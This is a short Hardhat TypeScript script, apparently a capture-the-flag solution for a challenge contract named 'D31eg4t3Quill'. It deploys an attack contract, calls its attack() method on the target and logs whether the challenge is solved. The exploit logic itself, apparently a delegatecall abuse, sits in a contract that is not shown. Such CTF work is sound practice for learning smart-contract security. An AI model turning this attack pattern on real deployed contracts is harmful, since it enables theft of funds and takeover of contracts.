import chalk from "chalk";
import { ethers } from "hardhat";
import { D31eg4t3Quill__factory, D31eg4t3Quill, D31eg4t3QuillAttack__factory } from "../../typechain";
import { log, initialize } from "../utils";


async function main() {
    let [d31eg4t3QuillContract, attacker] = await initialize<D31eg4t3Quill>(D31eg4t3Quill__factory);
    let delegateAttack = await new D31eg4t3QuillAttack__factory(attacker).deploy();
    await delegateAttack.waitForDeployment();
    let tx = await delegateAttack.attack(await d31eg4t3QuillContract.getAddress());
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await d31eg4t3QuillContract.canYouHackMe(attacker.address))}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});